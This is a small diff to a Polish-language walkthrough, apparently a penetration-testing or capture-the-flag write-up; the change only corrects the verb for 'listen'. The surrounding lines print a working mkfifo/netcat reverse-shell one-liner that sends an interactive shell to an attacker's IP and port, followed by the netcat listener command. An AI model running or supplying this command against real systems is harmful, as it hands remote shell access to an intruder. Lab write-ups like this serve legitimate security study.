@@ -175,7 +175,7 @@ Spróbujemy uzyskać dostęp do systemu poprzez reverse shell, używając nastę
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] [Port] >/tmp/f
 ```
-Następnie słuchamy połączeń za pomocą narzędzia netcat:
+Następnie nasłuchujemy połączeń za pomocą narzędzia netcat:
 ```
 nc -lvnp [Port]
 ```
